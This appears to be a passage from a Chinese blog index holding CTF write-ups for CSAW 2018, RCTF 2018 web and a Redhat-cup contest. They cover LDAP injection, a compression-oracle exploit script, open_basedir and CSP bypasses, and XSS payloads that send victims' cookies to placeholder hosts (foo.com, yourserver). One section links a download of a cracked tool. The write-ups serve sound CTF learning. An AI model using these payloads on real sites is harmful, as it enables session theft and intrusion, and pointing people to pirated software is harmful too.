&emsp;&emsp;关于非预期的解法，考虑到篇幅关系，所以决定另开一篇，并且争取还原整个解题过程。","link":"/2018/03/n1ctf-easy-harder-php1/"},{"title":"CSAW 2018 writeup","text":"前言&emsp;&emsp;很久没活动了，web能力显著下降。。。 WEBLdab123dabhttp://web.chal.csaw.io:8080 &emsp;&emsp;一直没看懂这道题的提示，打开页面后右上角出现： &emsp;&emsp;然后有一页人员名单，Here is a list of all users and groups。 &emsp;&emsp;尝试了一波注入后并没有发现突破点，后来经人提示才明白这是LDAP注入。&emsp;&emsp;关于LDAP：1234轻量级目录访问协议（LDAP）用于存储有关用户，主机和许多其他对象的信息。LDAP注入是服务器端攻击，可以允许公开，修改或插入有关LDAP结构中表示的用户和主机的敏感信息。这是通过操作输入参数然后传递给内部搜索，添加和修改函数来完成的。Web应用程序可以使用LDAP，以便用户在公司结构中对其他用户的信息进行身份验证或搜索。LDAP注入攻击的目标是在将由应用程序执行的查询中注入LDAP搜索过滤器元字符。&emsp;&emsp;LDAP的语法如下：| Metachar | Meaning||———-|———-||&amp; | Boolean AND|| | | Boolean OR||! | Boolean NOT|| = | Equals|| ~= | Approx|| = | Greater than|| &lt;= | Less than|| * | Any character|| () | Grouping parenthesis|&emsp;&emsp;所以LDAP表达and需要用(&amp;(condition1)(condition2))，or类似。同时它还支持正则语法主要是：.、*。&emsp;&emsp;一些例子：12345678如果我们想要在上面的LDAP结构中查询名为“ steve ”的人，我们的查询将如下所示：(cn=steve)也许我们想要搜索名称以“ s ” 开头的任何成员，那么我们可以使用通配符：(cn=s*)我们还可以使用“ | ”运算符搜索名称以“s”或“t”开头的任何人：(|(cn=s*)(cn=t*))&emsp;&emsp;题目中默认是GivenName，如： &emsp;&emsp;所以一般来说我们的flag应该就藏在某一项中，我们找一下LDAP attributes，看看其他字段中是否有flag。LDAP属性字段可以在这里找到。但都没有发现。使用*)(|(uid=*)列出所有项也还是没有出来。但可以确定的是flag就在这些项中，所以继续尝试，直到找到这个：1*)(uid=*))(|(uid=*&emsp;&emsp;得到flag： 参考链接&emsp;&emsp;https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006) &emsp;&emsp;http://www.4hou.com/technology/9090.html &emsp;&emsp;https://www.anquanke.com/post/id/159378 MISCbin_t12345Binary trees let you do some interesting things. Can you balance a tree?nc misc.chal.csaw.io 9001Equal nodes should be inserted to the right of the parent node. You should balance the tree as you add nodes. &emsp;&emsp;如题，nc上去会给出一组数字，而你的任务就是将这组数字转换成平衡二叉树，并且给出该ACL树的前序遍历，下面直接给代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248//AVL(自动平衡二叉树)#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef int ElemType;//每个结点的平均值typedef enum{ EH = 0, LH = 1, RH = -1 }bh_t; typedef enum{ FALSE = 0, TRUE = 1}bool_t; //定义平衡二叉树typedef struct BSTNode{ ElemType key; //平衡值 int bf; struct BSTNode *lchild,*rchild; }BSTNode, *BSTree; //中序遍历void InOrderTraverse(BSTree root){ if(NULL != root) { InOrderTraverse(root-&gt;lchild); printf(\"%d\\t\",root-&gt;key); InOrderTraverse(root-&gt;rchild); }} //前序遍历void PreOrderTraverse(BSTree root){ if(NULL != root) { printf(\"%d,\",root-&gt;key); PreOrderTraverse(root-&gt;lchild); PreOrderTraverse(root-&gt;rchild); }} //单向右旋转void R_Rotate(BSTree *p){ BSTree lc=(*p)-&gt;lchild; (*p)-&gt;lchild=lc-&gt;rchild; lc-&gt;rchild=*p; *p=lc;} //单向左旋转void L_Rotate(BSTree *p){ BSTree rc=(*p)-&gt;rchild; (*p)-&gt;rchild=rc-&gt;lchild; rc-&gt;lchild=*p; *p=rc;} //先左旋后右旋平衡旋转void LeftBalance(BSTree *T){ BSTree lc=(*T)-&gt;lchild; BSTree rd = lc-&gt;rchild; //判断进行向哪边旋转 switch(lc-&gt;bf) { case LH: (*T)-&gt;bf=lc-&gt;bf=EH; R_Rotate(T); break; case RH: switch(rd-&gt;bf) { case LH: (*T)-&gt;bf=RH; lc-&gt;bf=EH; break; case EH: (*T)-&gt;bf=lc-&gt;bf=EH; break; case RH: (*T)-&gt;bf=EH; lc-&gt;bf=LH; break; } rd-&gt;bf=EH; L_Rotate(&amp;((*T)-&gt;lchild)); R_Rotate(T); break; }} //先右旋后左旋平衡旋转void RightBalance(BSTree *T){ BSTree rc=(*T)-&gt;rchild; BSTree ld=rc-&gt;lchild; switch(rc-&gt;bf) { case RH: (*T)-&gt;bf=rc-&gt;bf=EH; L_Rotate(T); break; case LH: switch(ld-&gt;bf) { case RH: (*T)-&gt;bf=LH; rc-&gt;bf=EH; break; case EH: (*T)-&gt;bf=rc-&gt;bf=EH; break; case LH: (*T)-&gt;bf=EH; rc-&gt;bf=RH; break; } ld-&gt;bf=EH; R_Rotate(&amp;((*T)-&gt;rchild)); L_Rotate(T); break; }} //插入元素bool_t InsertAVL(BSTree *t,ElemType e,bool_t *taller){ if(NULL == t) return FALSE; if(NULL == *t) { *t=(BSTree)malloc(sizeof(BSTNode)); if(NULL == *t) return FALSE; (*t)-&gt;key=e; (*t)-&gt;lchild=(*t)-&gt;rchild=NULL; (*t)-&gt;bf=EH; *taller=TRUE; } else { if(e==(*t)-&gt;key) { *taller=FALSE; return FALSE; } if(e&lt;(*t)-&gt;key) { if(FALSE == InsertAVL(&amp;((*t)-&gt;lchild),e,taller)) return FALSE; if(*taller) { switch((*t)-&gt;bf) { case LH: LeftBalance(t); *taller=FALSE; break; case EH: (*t)-&gt;bf=LH; *taller=TRUE; break; case RH: (*t)-&gt;bf=EH; *taller=FALSE; break; } } } else { if(FALSE == InsertAVL(&amp;((*t)-&gt;rchild),e,taller)) return FALSE; if(*taller) { switch((*t)-&gt;bf) { case RH: RightBalance(t); *taller=FALSE; break; case EH: (*t)-&gt;bf=RH; *taller=TRUE; break; case LH: (*t)-&gt;bf=EH; *taller=FALSE; break; } } } } return TRUE;} static void destroy(BSTree *t){ if(NULL != *t) { destroy(&amp;((*t)-&gt;lchild)); destroy(&amp;((*t)-&gt;rchild)); free(*t); *t = NULL; } return;}void destroyAVL(BSTree root){ if(NULL != root) { destroy(&amp;root); } return;} int main(){ BSTree root=NULL,r; bool_t taller=FALSE; int array[]={16,67,87,73,81,71,11,38,49,59,30,85,73,26,58,35,50,72,70,50,76,17,94,8,58,55,68,88,15,37,75,27,75,30,1,85,94,27,7,71,8,9,70,4,17,21,38,29,2,71,85,5,59,67,83,93,47,5,81,29,64,36,15,89,45,90,40,21,53,51,35,57,5,11,48,23,44,66,71,81,95,73,17,42,1,98,19,34,6,87,68,21,78,88,78,17,97,49,90,5}; int i = 0; for(i=0; i &lt; 100; i++) InsertAVL(&amp;root,array[i],&amp;taller); printf(\"中序遍历:\\n\"); InOrderTraverse(root); printf(\"\\n先序遍历\\n\"); PreOrderTraverse(root); destroyAVL(root); root = NULL; return 0;} Algebra123Are you a real math wiz?nc misc.chal.csaw.io 9002 &emsp;&emsp;nc上去发现是解一元方程。 &emsp;&emsp;写一个求解器：12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding:utf-8 -*-import socketsc = socket.socket() # 创建 socket 对象host = \"misc.chal.csaw.io\" # 获取本地主机名port = 9002 # 设置端口addr = (host, port)sc.connect(addr) # 绑定端口号print sc.recv(1024)def solve1(eq,var='X'): eq1 = eq.replace(\"=\",\"-(\") + \")\" c = eval(eq1,{var:1j}) if (-c.real == 0): return 0 else: return -c.real/c.imagdef find(): data = sc.recv(1024) print data equation = data.split('\\n')[0] result = str(solve1(equation)) print '正在求解：' + equation + ', result = ' + result sc.send(result + '\\n') print '==========================='find()i = 1while True: print '============ 第 ' + str(i + 1) + ' 轮 ===============' data = sc.recv(2048) print data equation = data.split('\\n')[1] result = str(solve1(equation)) print '正在求解：' + equation + ', result = ' + result sc.send(result + '\\n') i += 1 Cryptoflatcrypt12345no logos or branding for this bugTake your pick nc crypto.chal.csaw.io 8040 nc crypto.chal.csaw.io 8041 nc crypto.chal.csaw.io 8042 nc crypto.chal.csaw.io 8043flag is not in flag format. flag is PROBLEM_KEY &emsp;&emsp;答题附件：12345678910111213141516171819202122# -*- coding: utf-8 -*-import zlibimport osfrom Crypto.Cipher import AESfrom Crypto.Util import CounterENCRYPT_KEY = bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000000')# Determine this key.# Character set: lowercase letters and underscorePROBLEM_KEY = 'not_flag'def encrypt(data, ctr): return AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter=ctr).encrypt(zlib.compress(data))while True: f = input(\"Encrypting service\\n\") if len(f) &lt; 20: continue enc = encrypt(bytes((PROBLEM_KEY + f).encode('utf-8')), Counter.new(64, prefix=os.urandom(8))) print(\"%s%s\" %(enc, chr(len(enc)))) &emsp;&emsp;这道题网上搜了一下发现有类似的题目。 &emsp;&emsp;&emsp;&emsp;http://www.blue-lotus.net/plaidctf-2013-crypto-compression250-writeup/ &emsp;&emsp;&emsp;&emsp;https://systemoverlord.com/2013/04/30/plaidctf-compression/ &emsp;&emsp;&emsp;&emsp;https://www.cnblogs.com/shuidao/p/3151067.html &emsp;&emsp;解题的关键是利用zlib.compress()压缩数据时造成的漏洞，当压缩的字符串中有3个以上重复的字符串时，LZ77压缩算法就会对字符串进行压缩。如：12345678910vvvvvBlah blah blah blah blah!^^^^^接下来的5个字符正好和已经在数据流中的字符串相等, 而且刚好在当前数据点的前5个字符开始. 在这个case中,我们可以在数据流中输出特殊的字符, 一个长度数字 和一个距离数字.目前数据是:Blah blah b压缩后的格式是:Blah b[D=5,L=5] &emsp;&emsp;再加上AES使用CTR流密码模式，那么待加密字符的长度不一样就会产生不一样长度的密文。这个可以用下面这个脚本体验一下：123456789101112131415161718192021222324252627import zlibimport osimport stringimport randomfrom Crypto.Cipher import AESfrom Crypto.Util import CounterENCRYPT_KEY = bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000000')# Determine this key.# Character set: lowercase letters and underscorePROBLEM_KEY = 'crime_doesnt_have_a_logo'padding = 'A' * 20def encrypt(data, ctr): return AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter=ctr).encrypt(zlib.compress(data))for i in range(30): f = padding + ''.join(random.sample(string.ascii_letters + string.digits, 4)) # if len(f) &lt; 20: # continue enc = encrypt(bytes((PROBLEM_KEY + f).encode('utf-8')), Counter.new(64, prefix=os.urandom(8))) print(\"%s --&gt; %s\" %(f, len(enc)))print('---------finally----------')enc = encrypt(bytes((PROBLEM_KEY + padding + 'crime').encode('utf-8')), Counter.new(64, prefix=os.urandom(8)))print(\"%s --&gt; %s\" %('crime', len(enc))) &emsp;&emsp;所以可以看出当我们能得到一个三个字符都一样的字符串时我们得到的长度就会变小（压缩），然后根据这三个字符不断的往前猜和往后猜就能找到所有的字符。 &emsp;&emsp;最终exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293# -*- coding: utf-8 -*-import socketimport random, stringsc = socket.socket() # 创建 socket 对象host = \"crypto.chal.csaw.io\" # 获取本地主机名port = 8040 # 设置端口addr = (host, port)sc.connect(addr) # 绑定端口号strs = 'abcdefghijklmnopqrstuvwxyz_'size = 20print sc.recv(1024)flag = ''padding = ''.join(random.sample(string.ascii_uppercase + string.digits + string.ascii_letters, size))print '[!] padding: ' + paddingdef get_fore(): last_len = 0 last_tmp = '' for f1 in strs: for f2 in strs: for f3 in strs: for f4 in strs: tmp = f1 + f2 + f3 + f4 if tmp == 'aaaa': continue data = padding + tmp sc.send(data + '\\n') temp = sc.recv(1024).split('\\n')[0] # print '[+] recv data: ' + temp try: len = ord(temp[-1:]) except: print '[ERROR] error...' print '[!] padding: ' + padding print '[!] recv data: ' + temp continue if last_len != 0 and last_len != len and tmp not in padding and last_tmp not in padding: # 找到一个 if last_len &gt; len: flag = tmp else: flag = last_tmp print '[*] some flag: ' + flag sc.close() exit(0) last_len = len print '%s --&gt; %s' % (tmp, str(len)) last_tmp = tmpdef get_more(target): i = 1 over = False while not over: last_len = 0 last_tmp = '' for f in strs: # data = padding + target[i:] + f # 向后 data = padding + f + target[:len(target) - i] # 向前 sc.send(data + '\\n') temp = sc.recv(1024).split('\\n')[0] print '[+] recv data: ' + temp lens = ord(temp[-1:]) print 'sended: %s --&gt; %s' % (data, str(lens)) if last_len != 0 and last_len != lens: # 找到一个 if last_len &gt; lens: # target += f # 向后 target = f + target else: # target += last_tmp # 向后 target = last_tmp + target print '[*] target: ' + target break last_len = lens last_tmp = f if f == '_': over = True print '[!] OVER!' i += 1get_fore() # 将得到的字符放入下个函数的参数中# get_more('aave') &emsp;&emsp;先运行get_fore()得到部分flag，然后代入get_more()，在该函数里按照向前、向后的注释运行，最终得到flag：rime_doesnt_have_a_logo。但是提交发现不对，然后队里的pwn大佬提出试一下前面加个c（’crime –&gt; 罪恶’），即crime_doesnt_have_a_logo，bingo！ Forensicssimple_recovery1Simple Recovery Try to recover the data from these RAID 5 images! &emsp;&emsp;给了两个镜像文件，file了一下：1disk.img0: Hitachi SH big-endian COFF object, not stripped &emsp;&emsp;参考链接：https://forensic.n0fate.com/2010/05/29/raid-system-forensics/ &emsp;&emsp;发现是要从两个raid5的镜像文件中恢复完整镜像，找到个破解版工具（建议虚拟机下使用）：1链接：https://pan.baidu.com/s/1lFsZ27h1rhZ_kEbglO4yBg 密码：o0ps &emsp;&emsp;最后可以得到一个完整的镜像文件，找到flag： &emsp;&emsp;flag{dis_week_evry_week_dnt_be_securty_weak} 🐼 Rewind1Sometimes you have to look back and replay what has been done right and wrong &emsp;&emsp;压缩包解开后有一个镜像文件和一份日志，file一下发现：1rewind-rr-snp: QEMU suspend to disk image &emsp;&emsp;发现是QEMU image，先是用010找了一下。 &emsp;&emsp;发现一大堆flag，但是我试到第三的时候flag就对了。。。 &emsp;&emsp;flag：flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/09/csaw-writeup/"},{"title":"RCTF2018 web writeup","text":"前言&emsp;&emsp;作为web狗饱受打击的一个比赛，0解题。任重而道远！ amp&emsp;&emsp;这道题严重忽视了出题人留下的提示，虽然也去Google了一下amp，但出来的结果并没有直接看出相关性，所以就一头扎进CSP的绕过方式上了，结果很显然。 &emsp;&emsp;首先AMP是：Google推出了一项名为 Accelerated Mobile Pages（AMP）的技术，号称能大大加快移动端页面呈现速度，提高整体体验。AMP HTML 是 HTML 的子集，在 AMP HTML 中只允许使用有限的HTML标签，并且它有自己的一套标签声明。 &emsp;&emsp;一个简单的AMP HTML模板如下： &emsp;&emsp;这跟我们题目里的是一样的，同时AMP HTML有如下特征(截选)： 包含顶级 标记（也接受 ） 包含 标记作为中的最后一个元素（这样做将会包括并加载 AMP JS 库） &emsp;&emsp;接下来的解题方法主要参考–&gt;这个。 &emsp;&emsp;首先我们先去了解一下AMP HTML对比HTML有哪些不一样的标签，然后从这些标签中找到可以进行利用的。AMP HTML的特性可以在这里找到：传送门。 &emsp;&emsp;在第一段我们就收获了有价值的信息，AMP HTML支持变量，可以在运行的时候动态的替换。 &emsp;&emsp;接着可以找到一个叫：Client ID的变量，它可以提供每个文档源出处（您发布AMP文档的网站的来源）和用户标识符。如果同一用户在一年内再次访问，客户端ID将相同。客户端ID应该与存储会话ID一年的cookie大致相似。如果AMP文档未通过Google AMP缓存提供，则客户ID将替换为cid scope参数名称的Cookie （请参阅下文）。如果它不存在，cookie将被设置为相同的名称。这些cookie将始终具有前缀“amp-”，随后是随机的base64编码字符串。 &emsp;&emsp;所以如果我们调用cookie的值就能被替换出来，所以我们可以构造：1&lt;amp-pixel src=\"https://foo.com/pixel?cid=CLIENT_ID(FLAG)\"&gt;&lt;/amp-pixel&gt; &emsp;&emsp;FLAG是cookie的名称。注意：amp-pixel只支持https，不支持http。 &emsp;&emsp;所以我们将foo.com换成自己的地址就行了。完整的payload：1http://amp.2018.teamrois.cn/?name=&lt;amp-pixel src=%22https://foo.com/index?cid=CLIENT_ID(FLAG)%22%3E%3C/amp-pixel%3E &emsp;&emsp;注意替换foo.com。然后我们可以在网络请求中看到数据外带的请求： &emsp;&emsp;成功的将我们本地的cookie传了出去，接着我们再提交，让bot去查看即可。 &emsp;&emsp;flag：RCTF{El_PsY_CONGRO0_sg0}。 r-cursive&emsp;&emsp;打开后可以找到两个源码：12345678910111213141516&lt;?php$token = sha1($_SERVER['REMOTE_ADDR']);$dir = '../sandbox/'.$token.'/';is_dir($dir) ?: mkdir($dir);is_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));switch($_GET['action'] ?: ''){ case 'go': header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/'); break; case 'reset': system('rm -rf '.$dir); break; default: show_source(__FILE__);}?&gt; 1234&lt;?phpsha1($_SERVER['REMOTE_ADDR']) === 'c664521db39c2da59f8f5b0eb7595bdf4e8a9043' ?: die();// R是递归匹配';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__); &emsp;&emsp;根据正则匹配条件和本地搭环境调试可以知道只能执行不带参数、函数名不含包括_在内的特殊符号，所以只能是aaa(bbb(ccc()))此类的调用形式。所以从cmd参数里进行函数执行是不太可能的了，比赛时也没有想到突破方法，后来才得知可以运行http header头来进行处理。 &emsp;&emsp;PHP中可以使用get_headers ,getallheaders获得HTTP请求头的信息，并返回键值数组，所以我们就只能用getallheaders()来获取。又因为返回的是数组，我们可以使用implode()来将数组转换成字符串。所以我们初步构造：implode(getallheaders())。但如果仅是这样还不能运行我们的代码，因为implode()返回的已经是字符串了，&quot;implode()&quot;（注意&quot;），有相当于多嵌套了一层字符，所以我们应该使用eval(implode(getallheaders()));来进行执行。如： &emsp;&emsp;注意需要在执行的语句后加//进行注释，防止eval出错。 &emsp;&emsp;绕过了cmd后，接下来就要考虑沙箱绕过了，先看看被禁用的函数及类。1234disable_classes:GlobIterator,DirectoryIterator,FilesystemIterator,RecursiveDirectoryIteratordisable_functions:system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link &emsp;&emsp;可以发现禁用的函数并不是很多，一些文件读取的函数都没有被禁用，尝试了一下读目录，但发现被禁止，然后可以发现open_basedir变量：1/var/www/sandbox/c664521db39c2da59f8f5b0eb7595bdf4e8a9043/:/tmp/ &emsp;&emsp;那我们主要的任务就是绕过open_basedir。自己网上找了相关的绕过方式，但利用条件都不满足，比如dl、替换so库等。 &emsp;&emsp;其实这道题的考点在虚拟主机配置的安全问题，Apache中有一个mod_vhost_alias模块，它的作用是 将 HTTP 请求中的 IP 地址和/或 Host: 头内容转换为所要提供服务的文件的路径名称来创建动态的虚拟主机配置。 &emsp;&emsp;在stackoverflow中有一个动态通过mod_vhost_alias来配置open_basedir的答案，传送门。这是它的一个答案： &emsp;&emsp;而刚好从phpinfo()里能查看到这个参数： &emsp;&emsp;当我们尝试修改host，将c664521db39c2da59f8f5b0eb7595bdf4e8a9043去掉，发现报了个403。 &emsp;&emsp;猜测这时候我们默认访问的是/var/www/sandbox/，这个目录下是没有index.php的，所以报了个403，为了确认我们的猜想，我们可以尝试访问init.php，这个文件根据phpinfo是在/var/www/sandbox/下的。结果如下： &emsp;&emsp;这证实了我们的猜想，此时我们在/var/www/sandbox/下，所以我们再去访问c664521db39c2da59f8f5b0eb7595bdf4e8a9043下的index.php以执行我们的cmd。 &emsp;&emsp;我们成功修改(绕过)了open_basedir，接着我们读取init.php的内容。 &emsp;&emsp;成功拿到flag：RCTF{apache_mod_vhost_alias_should_be_configured_correctly}。 rBlog 2018&emsp;&emsp;这道题有两种解法，一是CSP绕过，二是使用webp文件。 解法一：CSP绕过&emsp;&emsp;打开后发现一个标准的XSS利用攻击，我们提交一篇文章，管理员会去点击查看，从而盗取cookies。 &emsp;&emsp;抓包后修改下各参数的值： &emsp;&emsp;插完后可以看到title和style处可以直接插入script，但由于CSP的关系导致不能执行。 &emsp;&emsp;我们可以用Google的CSP检查工具检查一下该网站的安全性。结果如下： &emsp;&emsp;可以看到script是没法利用的了，但由于base-uri缺失导致我们可以进行偷梁换柱。 &emsp;&emsp;由于页面使用的是相对路径，默认是访问本站点下的”/assets/js/jquery.min.js”，放到这里就是：1http://rblog.2018.teamrois.cn/assets/js/jquery.min.js &emsp;&emsp;首先我们了解下base标签的用途：12345&lt;base&gt; 标签为页面上的所有链接规定默认地址或默认目标。通常情况下，浏览器会从当前文档的 URL 中提取相应的元素来填写相对 URL 中的空白。使用 &lt;base&gt; 标签可以改变这一点。浏览器随后将不再使用当前文档的 URL，而使用指定的基本 URL 来解析所有的相对 URL。这其中包括 &lt;a&gt;、&lt;img&gt;、&lt;link&gt;、&lt;form&gt;、 &lt;script&gt;标签中的 URL。 &emsp;&emsp;所以我们重置这个标签，如：1&lt;base href = \"https://yourserver\" /&gt; &emsp;&emsp;那么在访问jquery.min.js的时候就会变成访问：1https://yourserver/assets/js/jquery.min.js &emsp;&emsp;所以我们在自己的服务器上放一个路径跟文件名一样的环境，然后尝试弹一下窗。 &emsp;&emsp;结果如下： &emsp;&emsp;成功弹窗，那么接下来就获取cookie并打到自己的服务器上，一般的，我们可以使用：1234var payload = document.cookie;var xhttp = new XMLHttpRequest();xhttp.open(\"GET\", \"http://yourserver/?\" + payload, true);xhttp.send(); &emsp;&emsp;尝试获取失败，因为CSP禁用了AJAX，我们只能执行内嵌的script，但这已经足够了，一个解决方法就是偷盗nonce，我们偷一个nonce id添加到我们的script上，从而光明正大的绕过CSP。payload如下：12345678var payload = document.cookie;var nonce = document.querySelector(\"script\").nonce;var src = `http://yourserver/?${payload}`var s = document.createElement('script')s.type = 'text/javascript's.src = srcs.setAttribute('nonce', nonce)document.body.appendChild(s); &emsp;&emsp;最终可以得到flag：RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}。 解法二：使用webp文件&emsp;&emsp;首先介绍一下webp。如果不想点开就直接看wiki的引用： &emsp;&emsp;说通俗点就是Google开发的一种减少图片大小，但尽量不影响图片的质量的技术。 &emsp;&emsp;它有一个特性就是PHP能识别它为图片，但Apache不行，体现在http请求头的Content-Type字段上，这是利用的一个大前提。这样导致的一个结果是当我们请求这个网页是返回的是文本，而如果是在script里请求的，那么它就会当成js脚本执行。 &emsp;&emsp;构成漏洞的另一个条件就是上面提到的style字段我们可以控制，这样我们就可以让他去请求我们构造的恶意js。 &emsp;&emsp;接下来我们就要构造一个脚本，这里作者寻找了挺久的解决方案，终于找到了一套工具。传送门，具体工具的：下载工具，找自己系统最新的版本即可 &emsp;&emsp;下载后我们用系统自带的画图创建一个1像素的jpg图片，这个可以在画图的：文件 –&gt; 属性里设置。这里我们该图片命令为aa.jpg，然后进入到前面下载的工具的目录下执行：12# -o是输出文件的名称 --metadata其实在这里没有必要cwebp.exe aa.jpg -o bb.webp &emsp;&emsp;bb.webp的内容应该是这样的： &emsp;&emsp;根据webp规范，我们如果要添加元数据，应该是exif段。 &emsp;&emsp;所以我们应该在exif的数据段插入我们的js代码，所以我们先整一个exif文件模板，然后通过webpmux工具将exif加入到我们的bb.webp里，这里我使用这款工具：下载地址，当然其他工具也是可以的。 &emsp;&emsp;打开这个工具，新建一个exif模板，插入一个内容，如下： &emsp;&emsp;只要数据类型是ASCII的都行。然后再在上面下载的webp工具包里执行：1webpmux.exe -set exif exif.exif bb.webp -o cc.webp &emsp;&emsp;此时cc.webp里就有我们的恶意代码了： &emsp;&emsp;这里再补充一点为什么插入的是：1*/=1;xxxx;/* &emsp;&emsp;首先在JS中是支持这种写法的，在赋值语句中插入注释，如：1aaa/*bbbb*/=1; &emsp;&emsp;可以注意到我们的webp文件是有特定的文件头RIFF的，如果直接交给js解析会出现错误，而上面这种写法就可以避免错误产生。所以我们修改如下： &emsp;&emsp;但是每种文件都有自己的文件格式，我们修改的那段字符到底代表什么意思呢，我们再看看webp的规范。 &emsp;&emsp;很明显我们修改的是文件大小的标志，为了使我们的webp有效，我们必须构造0x2f2a=12074的文件大小，后面的内容我们可以用0x00填充。最终我们构造的文件如下： &emsp;&emsp;记得在最后加上*/以闭合前面的注释符。 &emsp;&emsp;顺便在放一下我这里使用的两个webp文件： tmp1.webp tmp2.webp &emsp;&emsp;接下来我们将这个图片提交上去。得到这个图片的地址，如：1http://rblog.2018.teamrois.cn/upload/images/06b40f7bc09e17dfafa34abc113abea6.webp &emsp;&emsp;再接着我们重新开一个页面，这里我们需要两个页面配合攻击，第一个先上传图片，第二个引用该图片引发攻击，构造如下：12我们那个图片的相对地址：../../../upload/images/06b40f7bc09e17dfafa34abc113abea6.webp# &emsp;&emsp;可以看到成功弹窗，说明我们的js被执行，那么接下来我们就获取cookie了，将上面的文件中的js替换一下：1*/=1;window.location.href=\"http://yourip/?cookie=\"+document.cookie;/* &emsp;&emsp;再用相同的方法提交，并在另一个新的请求中替换style的值为该图片的地址。然后把这个新的页面的地址提交到report。最终我们可以收到一个cookie： &emsp;&emsp;所以flag：RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}。然后还有第二关的提示：http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d。 &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/05/rctf-web-writeup1/"},{"title":"2018 广东省红帽杯redhat writeup","text":"前言&emsp;&emsp;这次省红帽杯的WEB部分大体不难（除去一道没人做出来的），但是对于比赛经验不丰富的选手来说，难点主要是在对题型的把控上，只要get到点，后面的操作基本没问题。自己从这次比赛中也学到了很多东西，任重道远啊。 杂项Not Only Wireshark hint: tshark &emsp;&emsp;打开数据包后发现都是tcp、http的数据报文，这种报文还是比较好处理的，所以就用wireshark处理了，还好数据不多。我们直接导出他们之间的数据包看看，wireshark的操作：文件 –&gt; 导出对象 –&gt; HTTP。 &emsp;&emsp;这里让人感到奇怪的就是?name=后面的值都是16进制的，而且从服务器的响应报文来看，都没有什么实际的东西，所以一个想法就是这一串16进制可能藏着什么东西，所以我们把这些数据都提取出来，虽然提示了tshark，但奈何自己不会，所以下面就手工提取了。&emsp;&emsp;首先我们筛选出这些数据，使用：tcp matches &quot;GET&quot;就行，下拉到目标。 &emsp;&emsp;这里好在只有百来个包，再多点就真的要考虑去学tshark了。还一个要注意的就是一定不能从保存的文件中提取，因为文件夹里的排序顺序跟数据包的不一致，所以导致提取的数据是不正确的。 &emsp;&emsp;提取的数据如下：1123404B03040A0001080000739C8C4B7B36E495200000001400000004000000666C616781CD460EB62015168D9E64B06FC1712365FDE5F987916DD8A52416E83FDE98FB504B01023F000A0001080000739C8C4B7B36E4952000000014000000040024000000000000002000000000000000666C61670A00200000000000010018000DB39B543D73D301A1ED91543D73D301F99066543D73D301504B0506000000000100010056000000420000000000&emsp;&emsp;我们把它以16进制写入文件，我这是用python写入的：1234567# -*- coding: utf-8 -*-sss = '123404B03040A0001080000739C8C4B7B36E495200000001400000004000000666C616781CD460EB62015168D9E64B06FC1712365FDE5F987916DD8A52416E83FDE98FB504B01023F000A0001080000739C8C4B7B36E4952000000014000000040024000000000000002000000000000000666C61670A00200000000000010018000DB39B543D73D301A1ED91543D73D301F99066543D73D301504B05060000000001000100560000004200000000001'f = open('123', 'wb')hex_s = sss.decode('hex')f.write(hex_s)f.close()&emsp;&emsp;运行后你会发现有错误： &emsp;&emsp;一番百度、Google后，终于找到了原因，原来字符的长度是奇数，我们在他后面添加一位0或1都行，然后用010editor打开。 &emsp;&emsp;咋一看，还真没什么东西，自己这里也卡了好一会，然后在不经意间注意到了： &emsp;&emsp;首先在开头这的123404B0304跟zip的文件头50480304很像，而且从上面的奇数报错中可以联想到将1234改成5不就偶数而且是zip的文件了吗，然后后面还有zip的50480506的结束标志。我们验证一下猜想，重新写入： &emsp;&emsp;事实证明我们是对的，但是需要解压密码，一开始尝试伪加密，弄了一通，无果。然后再去分析数据包，然后一条奇怪的请求就出现了： &emsp;&emsp;别的都是name作为参数，而这是key，而且格式也不对。所以尝试用这个密码打开：?id=1128%23，最后得到flag：&gt;flag{1m_s0_ang4y_1s}### 听说你们喜欢手工爆破&gt;flag{}内英文字母为大写形式&emsp;&emsp;下载压缩包解压后可以得到一堆内容相同但文件名不同的txt和需要密码的压缩包。 &emsp;&emsp;将文件中的：VGgzcjMgMXMgbjAgZjFhZw==和它进行base64解密后的结果：Th3r3 1s n0 f1ag试了一下，发现密码都不对。但是考虑到题目给那么多文件不应该没用，所以就想到将所有的文件名提取出来试试。写个脚本：12345678# -*- coding: utf-8 -*-import osfile = open('password.txt', 'w+')for root,dirs,files in 